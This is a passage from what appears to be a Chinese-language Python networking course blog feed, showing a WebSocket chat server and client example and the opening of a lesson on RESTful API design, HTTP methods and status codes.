class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(connected_clients)&#125;</span> 人&quot;</span>)<br><br>        <span class="hljs-comment"># 广播用户离开消息</span><br>        leave_msg = &#123;<br>            <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;user_leave&quot;</span>,<br>            <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">f&quot;用户 <span class="hljs-subst">&#123;client_id&#125;</span> 离开了聊天室&quot;</span>,<br>            <span class="hljs-string">&quot;online_count&quot;</span>: <span class="hljs-built_in">len</span>(connected_clients),<br>            <span class="hljs-string">&quot;timestamp&quot;</span>: datetime.now().isoformat()<br>        &#125;<br>        <span class="hljs-keyword">await</span> broadcast(json.dumps(leave_msg, ensure_ascii=<span class="hljs-literal">False</span>))<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">broadcast</span>(<span class="hljs-params">message, exclude=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    广播消息给所有客户端</span><br><span class="hljs-string"></span><br><span class="hljs-string">    参数：</span><br><span class="hljs-string">        message: 要广播的消息</span><br><span class="hljs-string">        exclude: 排除的WebSocket连接（可选）</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> connected_clients:<br>        <span class="hljs-comment"># 过滤掉exclude的连接</span><br>        clients = connected_clients - &#123;exclude&#125; <span class="hljs-keyword">if</span> exclude <span class="hljs-keyword">else</span> connected_clients<br><br>        <span class="hljs-comment"># 并发发送给所有客户端</span><br>        <span class="hljs-keyword">await</span> asyncio.gather(<br>            *[client.send(message) <span class="hljs-keyword">for</span> client <span class="hljs-keyword">in</span> clients],<br>            return_exceptions=<span class="hljs-literal">True</span><br>        )<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;启动WebSocket服务器&quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    ╔══════════════════════════════════════════════════════════╗</span><br><span class="hljs-string">    ║       WebSocket 服务器                                    ║</span><br><span class="hljs-string">    ║       WebSocket Server                                   ║</span><br><span class="hljs-string">    ╚══════════════════════════════════════════════════════════╝</span><br><span class="hljs-string"></span><br><span class="hljs-string">    服务器地址: ws://localhost:8765</span><br><span class="hljs-string">    等待客户端连接...</span><br><span class="hljs-string">    &quot;&quot;&quot;</span>)<br><br>    <span class="hljs-comment"># 启动服务器</span><br>    server = <span class="hljs-keyword">await</span> websockets.serve(<br>        handle_client,<br>        <span class="hljs-string">&quot;localhost&quot;</span>,<br>        <span class="hljs-number">8765</span><br>    )<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;WebSocket服务器已启动&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;按 Ctrl+C 停止服务器\n&quot;</span>)<br><br>    <span class="hljs-comment"># 保持服务器运行</span><br>    <span class="hljs-keyword">await</span> asyncio.Future()  <span class="hljs-comment"># 永久运行</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">try</span>:<br>        asyncio.run(main())<br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n服务器已停止&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="3-2-客户端代码"><a href="#3-2-客户端代码" class="headerlink" title="3.2 客户端代码"></a>3.2 客户端代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day31_websocket_client.py</span><br><span class="hljs-comment"># 功能：WebSocket客户端</span><br><br><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> websockets<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">client</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;WebSocket客户端&quot;&quot;&quot;</span><br>    uri = <span class="hljs-string">&quot;ws://localhost:8765&quot;</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    ╔══════════════════════════════════════════════════════════╗</span><br><span class="hljs-string">    ║       WebSocket 客户端                                    ║</span><br><span class="hljs-string">    ║       WebSocket Client                                   ║</span><br><span class="hljs-string">    ╚══════════════════════════════════════════════════════════╝</span><br><span class="hljs-string">    &quot;&quot;&quot;</span>)<br><br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> websockets.connect(uri) <span class="hljs-keyword">as</span> websocket:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;已连接到服务器: <span class="hljs-subst">&#123;uri&#125;</span>\n&quot;</span>)<br><br>        <span class="hljs-comment"># 启动接收消息的任务</span><br>        receive_task = asyncio.create_task(receive_messages(websocket))<br><br>        <span class="hljs-comment"># 启动心跳任务</span><br>        heartbeat_task = asyncio.create_task(send_heartbeat(websocket))<br><br>        <span class="hljs-comment"># 发送消息</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;输入消息并按Enter发送（输入&#x27;quit&#x27;退出）：\n&quot;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                message = <span class="hljs-keyword">await</span> asyncio.get_event_loop().run_in_executor(<br>                    <span class="hljs-literal">None</span>, <span class="hljs-built_in">input</span>, <span class="hljs-string">&quot;你: &quot;</span><br>                )<br><br>                <span class="hljs-keyword">if</span> message.lower() == <span class="hljs-string">&#x27;quit&#x27;</span>:<br>                    <span class="hljs-keyword">break</span><br><br>                <span class="hljs-comment"># 发送聊天消息</span><br>                chat_msg = &#123;<br>                    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;chat&quot;</span>,<br>                    <span class="hljs-string">&quot;message&quot;</span>: message,<br>                    <span class="hljs-string">&quot;timestamp&quot;</span>: datetime.now().isoformat()<br>                &#125;<br>                <span class="hljs-keyword">await</span> websocket.send(json.dumps(chat_msg, ensure_ascii=<span class="hljs-literal">False</span>))<br><br>        <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>            <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">finally</span>:<br>            receive_task.cancel()<br>            heartbeat_task.cancel()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n已断开连接&quot;</span>)<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">receive_messages</span>(<span class="hljs-params">websocket</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;接收服务器消息&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">async</span> <span class="hljs-keyword">for</span> message <span class="hljs-keyword">in</span> websocket:<br>            data = json.loads(message)<br><br>            <span class="hljs-keyword">if</span> data[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;system&#x27;</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[系统] <span class="hljs-subst">&#123;data[<span class="hljs-string">&#x27;message&#x27;</span>]&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">elif</span> data[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;user_join&#x27;</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[通知] <span class="hljs-subst">&#123;data[<span class="hljs-string">&#x27;message&#x27;</span>]&#125;</span> (在线: <span class="hljs-subst">&#123;data[<span class="hljs-string">&#x27;online_count&#x27;</span>]&#125;</span>)&quot;</span>)<br>            <span class="hljs-keyword">elif</span> data[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;user_leave&#x27;</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[通知] <span class="hljs-subst">&#123;data[<span class="hljs-string">&#x27;message&#x27;</span>]&#125;</span> (在线: <span class="hljs-subst">&#123;data[<span class="hljs-string">&#x27;online_count&#x27;</span>]&#125;</span>)&quot;</span>)<br>            <span class="hljs-keyword">elif</span> data[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;chat&#x27;</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[<span class="hljs-subst">&#123;data[<span class="hljs-string">&#x27;from&#x27;</span>]&#125;</span>]: <span class="hljs-subst">&#123;data[<span class="hljs-string">&#x27;message&#x27;</span>]&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">elif</span> data[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;pong&#x27;</span>:<br>                <span class="hljs-comment"># 心跳响应，不显示</span><br>                <span class="hljs-keyword">pass</span><br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;你: &quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>, flush=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-keyword">except</span> asyncio.CancelledError:<br>        <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">send_heartbeat</span>(<span class="hljs-params">websocket</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;发送心跳&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">30</span>)  <span class="hljs-comment"># 每30秒</span><br>            ping_msg = &#123;<br>                <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;ping&quot;</span>,<br>                <span class="hljs-string">&quot;timestamp&quot;</span>: datetime.now().isoformat()<br>            &#125;<br>            <span class="hljs-keyword">await</span> websocket.send(json.dumps(ping_msg))<br>    <span class="hljs-keyword">except</span> asyncio.CancelledError:<br>        <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    asyncio.run(client())<br></code></pre></td></tr></table></figure><hr><h2 id="4-WebSocket-vs-HTTP对比"><a href="#4-WebSocket-vs-HTTP对比" class="headerlink" title="4. WebSocket vs HTTP对比"></a>4. WebSocket vs HTTP对比</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs">对比总结：<br><br>┌────────────┬───────────────────┬───────────────────┐<br>│ 特性       │ HTTP              │ WebSocket         │<br>├────────────┼───────────────────┼───────────────────┤<br>│ 通信方向   │ 单向（请求-响应） │ 双向（全双工）    │<br>│ 连接       │ 短连接            │ 长连接            │<br>│ 开销       │ 每次请求都有头部  │ 握手后开销小      │<br>│ 实时性     │ 差（需轮询）      │ 好（推送）        │<br>│ 服务器推送 │ 不支持            │ 支持              │<br>│ 适用场景   │ 传统Web应用       │ 实时应用          │<br>└────────────┴───────────────────┴───────────────────┘<br><br>适用场景：<br><br>WebSocket适合：<br>✅ 实时聊天<br>✅ 在线游戏<br>✅ 实时协作（文档编辑）<br>✅ 实时数据展示（股票、监控）<br>✅ 推送通知<br><br>HTTP适合：<br>✅ 传统网页浏览<br>✅ RESTful API<br>✅ 文件上传/下载<br>✅ 不需要实时性的应用<br></code></pre></td></tr></table></figure><hr><h2 id="5-今日练习"><a href="#5-今日练习" class="headerlink" title="5. 今日练习"></a>5. 今日练习</h2><h3 id="练习1：实现简单聊天室"><a href="#练习1：实现简单聊天室" class="headerlink" title="练习1：实现简单聊天室"></a>练习1：实现简单聊天室</h3><p>运行WebSocket服务器和多个客户端，测试：</p><ol><li>消息广播</li><li>用户加入&#x2F;离开通知</li><li>在线人数统计</li></ol><h3 id="练习2：添加功能"><a href="#练习2：添加功能" class="headerlink" title="练习2：添加功能"></a>练习2：添加功能</h3><p>扩展聊天室功能：</p><ol><li>用户命名</li><li>私聊功能</li><li>消息历史记录</li><li>断线重连</li></ol><hr><p><strong>进度：31&#x2F;120天（25.8%）</strong></p><p>明天我们将进行实战项目：构建完整的Web API服务！</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>30天：RESTful API设计</title>
    <link href="/2025/11/10/30%E5%A4%A9%EF%BC%9ARESTful%20API%E8%AE%BE%E8%AE%A1/"/>
    <url>/2025/11/10/30%E5%A4%A9%EF%BC%9ARESTful%20API%E8%AE%BE%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="第30天：RESTful-API设计"><a href="#第30天：RESTful-API设计" class="headerlink" title="第30天：RESTful API设计"></a>第30天：RESTful API设计</h1><blockquote><p>“好的API设计就像好的用户界面，让使用者感到直观和愉悦！”</p></blockquote><h2 id="📚-今日目标"><a href="#📚-今日目标" class="headerlink" title="📚 今日目标"></a>📚 今日目标</h2><ul><li>理解REST架构风格</li><li>掌握RESTful API设计原则</li><li>学习HTTP方法的正确使用</li><li>理解资源和URI设计</li><li>掌握API版本控制和错误处理</li><li>实现一个简单的RESTful API</li></ul><hr><h2 id="1-REST基础概念"><a href="#1-REST基础概念" class="headerlink" title="1. REST基础概念"></a>1. REST基础概念</h2><h3 id="1-1-什么是REST？"><a href="#1-1-什么是REST？" class="headerlink" title="1.1 什么是REST？"></a>1.1 什么是REST？</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">REST (Representational State Transfer)<br>表述性状态转移<br><br>核心思想：<br><span class="hljs-bullet">- </span>资源（Resource）为中心<br><span class="hljs-bullet">- </span>使用标准HTTP方法<br><span class="hljs-bullet">- </span>无状态通信<br><span class="hljs-bullet">- </span>统一接口<br><br>REST不是协议，而是一种架构风格<br><br>类比：<br>REST API = 图书馆管理系统<br><span class="hljs-bullet">- </span>资源 = 书籍<br><span class="hljs-bullet">- </span>URI = 书籍编号<br><span class="hljs-bullet">- </span>HTTP方法 = 操作（借、还、查、删）<br><span class="hljs-bullet">- </span>状态码 = 操作结果（成功、失败、未找到）<br><br>例如：<br>GET /books/123        → 查询123号书<br>POST /books           → 新增一本书<br>PUT /books/123        → 更新123号书<br>DELETE /books/123     → 删除123号书<br></code></pre></td></tr></table></figure><h3 id="1-2-REST的六大约束"><a href="#1-2-REST的六大约束" class="headerlink" title="1.2 REST的六大约束"></a>1.2 REST的六大约束</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 客户端-服务器分离 (Client-Server)<br><span class="hljs-bullet">   -</span> 客户端和服务器独立演化<br><span class="hljs-bullet">   -</span> 前后端分离<br><br><span class="hljs-bullet">2.</span> 无状态 (Stateless)<br><span class="hljs-bullet">   -</span> 每个请求包含所有必要信息<br><span class="hljs-bullet">   -</span> 服务器不保存客户端状态<br><span class="hljs-bullet">   -</span> 易于扩展和负载均衡<br><br><span class="hljs-bullet">3.</span> 可缓存 (Cacheable)<br><span class="hljs-bullet">   -</span> 响应可以被缓存<br><span class="hljs-bullet">   -</span> 提高性能<br><br><span class="hljs-bullet">4.</span> 分层系统 (Layered System)<br><span class="hljs-bullet">   -</span> 客户端不知道直接连接的是服务器还是中间层<br><span class="hljs-bullet">   -</span> 可以加入负载均衡、缓存等<br><br><span class="hljs-bullet">5.</span> 统一接口 (Uniform Interface)<br><span class="hljs-bullet">   -</span> 资源标识（URI）<br><span class="hljs-bullet">   -</span> 通过表述操作资源<br><span class="hljs-bullet">   -</span> 自描述消息<br><span class="hljs-bullet">   -</span> 超媒体驱动（HATEOAS）<br><br><span class="hljs-bullet">6.</span> 按需代码（可选）(Code on Demand)<br><span class="hljs-bullet">   -</span> 服务器可以返回可执行代码<br><span class="hljs-bullet">   -</span> 如JavaScript<br></code></pre></td></tr></table></figure><hr><h2 id="2-RESTful-API设计原则"><a href="#2-RESTful-API设计原则" class="headerlink" title="2. RESTful API设计原则"></a>2. RESTful API设计原则</h2><h3 id="2-1-资源和URI设计"><a href="#2-1-资源和URI设计" class="headerlink" title="2.1 资源和URI设计"></a>2.1 资源和URI设计</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">资源设计原则：<br><br>1. 使用名词，不使用动词<br>   ✅ 好的设计:<br>   GET  /users          <span class="hljs-comment"># 获取用户列表</span><br>   GET  /users/123      <span class="hljs-comment"># 获取ID为123的用户</span><br>   POST /users          <span class="hljs-comment"># 创建新用户</span><br><br>   ❌ 不好的设计:<br>   GET  /getUsers<br>   POST /createUser<br>   GET  /user/delete/123<br><br>2. 使用复数形式<br>   ✅ 好: /users, /products, /orders<br>   ❌ 差: /user, /product, /order<br><br>3. 使用小写字母和连字符<br>   ✅ 好: /user-profiles, /product-categories<br>   ❌ 差: /UserProfiles, /product_categories<br><br>4. 资源嵌套表示关系<br>   ✅ 好: /users/123/orders        <span class="hljs-comment"># 用户123的订单</span><br>        /orders/456/items        <span class="hljs-comment"># 订单456的商品</span><br><br>   但不要嵌套太深（最多2-3层）<br>   ❌ 差: /users/123/orders/456/items/789/reviews<br><br>5. 使用查询参数进行过滤、排序、分页<br>   /users?role=admin              <span class="hljs-comment"># 过滤</span><br>   /users?<span class="hljs-built_in">sort</span>=created_at&amp;order=desc  <span class="hljs-comment"># 排序</span><br>   /users?page=2&amp;<span class="hljs-built_in">limit</span>=20         <span class="hljs-comment"># 分页</span><br>   /users?fields=<span class="hljs-built_in">id</span>,name,email    <span class="hljs-comment"># 字段选择</span><br></code></pre></td></tr></table></figure><h3 id="2-2-HTTP方法使用"><a href="#2-2-HTTP方法使用" class="headerlink" title="2.2 HTTP方法使用"></a>2.2 HTTP方法使用</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs gradle">标准HTTP方法及其用途：<br><br>┌────────┬──────────┬─────────┬─────────┬──────────┐<br>│ 方法   │ 用途     │ 安全性  │ 幂等性  │ 可缓存   │<br>├────────┼──────────┼─────────┼─────────┼──────────┤<br>│ GET    │ 获取资源 │ 是      │ 是      │ 是       │<br>│ POST   │ 创建资源 │ 否      │ 否      │ 否       │<br>│ PUT    │ 更新资源 │ 否      │ 是      │ 否       │<br>│ PATCH  │ 部分更新 │ 否      │ 否      │ 否       │<br>│ <span class="hljs-keyword">DELETE</span> │ 删除资源 │ 否      │ 是      │ 否       │<br>│ HEAD   │ 获取头部 │ 是      │ 是      │ 是       │<br>│ <span class="hljs-keyword">OPTIONS</span>│ 获取选项 │ 是      │ 是      │ 否       │<br>└────────┴──────────┴─────────┴─────────┴──────────┘<br><br>详细说明：<br><br>GET - 获取资源<br>  GET /users           → 获取所有用户<br>  GET <span class="hljs-regexp">/users/</span><span class="hljs-number">123</span>       → 获取ID为<span class="hljs-number">123</span>的用户<br>  特点：安全、幂等、可缓存<br><br>POST - 创建新资源<br>  POST /users<br>  Body: &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;张三&quot;</span>, <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;zhang@example.com&quot;</span>&#125;<br>  特点：不安全、不幂等<br><br>PUT - 完整更新资源<br>  PUT <span class="hljs-regexp">/users/</span><span class="hljs-number">123</span><br>  Body: &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;张三&quot;</span>, <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;new@example.com&quot;</span>, <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">30</span>&#125;<br>  特点：幂等（多次执行结果相同）<br>  要求：必须提供完整的资源数据<br><br>PATCH - 部分更新资源<br>  PATCH <span class="hljs-regexp">/users/</span><span class="hljs-number">123</span><br>  Body: &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;new@example.com&quot;</span>&#125;<br>  特点：只更新提供的字段<br>  更灵活，推荐使用<br><br><span class="hljs-keyword">DELETE</span> - 删除资源<br>  <span class="hljs-keyword">DELETE</span> <span class="hljs-regexp">/users/</span><span class="hljs-number">123</span><br>  特点：幂等（删除多次结果相同）<br><br>HEAD - 获取资源元数据<br>  HEAD <span class="hljs-regexp">/users/</span><span class="hljs-number">123</span><br>  返回：只返回响应头，不返回响应体<br>  用途：检查资源是否存在、获取资源大小等<br><br><span class="hljs-keyword">OPTIONS</span> - 获取资源支持的方法<br>  <span class="hljs-keyword">OPTIONS</span> /users<br>  返回：Allow: GET, POST, PUT, <span class="hljs-keyword">DELETE</span><br>  用途：CORS预检请求<br></code></pre></td></tr></table></figure><h3 id="2-3-状态码使用"><a href="#2-3-状态码使用" class="headerlink" title="2.3 状态码使用"></a>2.3 状态码使用</h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs tap">HTTP状态码分类：<br><br>1xx - 信息性<br> <span class="hljs-number"> 100 </span>Continue              <span class="hljs-comment"># 继续请求</span><br><br>2xx - 成功<br> <span class="hljs-number"> 200 </span>OK                    <span class="hljs-comment"># 成功（GET, PUT, PATCH）</span><br> <span class="hljs-number"> 201 </span>Created               <span class="hljs-comment"># 创建成功（POST）</span><br> <span class="hljs-number"> 202 </span>Accepted              <span class="hljs-comment"># 已接受，处理中（异步操作）</span><br> <span class="hljs-number"> 204 </span>No Content            <span class="hljs-comment"># 成功，无返回内容（DELETE）</span><br><br>3xx - 重定向<br> <span class="hljs-number"> 301 </span>Moved Permanently     <span class="hljs-comment"># 永久重定向</span><br> <span class="hljs-number"> 302 </span>Found                 <span class="hljs-comment"># 临时重定向</span><br> <span class="hljs-number"> 304 </span>Not Modified          <span class="hljs-comment"># 未修改（缓存有效）</span><br><br>4xx - 客户端错误<br> <span class="hljs-number"> 400 </span>Bad Request           <span class="hljs-comment"># 请求参数错误</span><br> <span class="hljs-number"> 401 </span>Unauthorized          <span class="hljs-comment"># 未认证</span><br> <span class="hljs-number"> 403 </span>Forbidden             <span class="hljs-comment"># 无权限</span><br> <span class="hljs-number"> 404 </span>Not Found             <span class="hljs-comment"># 资源不存在</span><br> <span class="hljs-number"> 405 </span>Method Not Allowed    <span class="hljs-comment"># 方法不允许</span><br> <span class="hljs-number"> 409 </span>Conflict              <span class="hljs-comment"># 资源冲突</span><br> <span class="hljs-number"> 422 </span>Unprocessable Entity  <span class="hljs-comment"># 验证失败</span><br> <span class="hljs-number"> 429 </span>Too Many Requests     <span class="hljs-comment"># 请求过多</span><br><br>5xx - 服务器错误<br> <span class="hljs-number"> 500 </span>Internal Server Error <span class="hljs-comment"># 服务器内部错误</span><br> <span class="hljs-number"> 502 </span>Bad Gateway           <span class="hljs-comment"># 网关错误</span><br> <span class="hljs-number"> 503 </span>Service Unavailable   <span 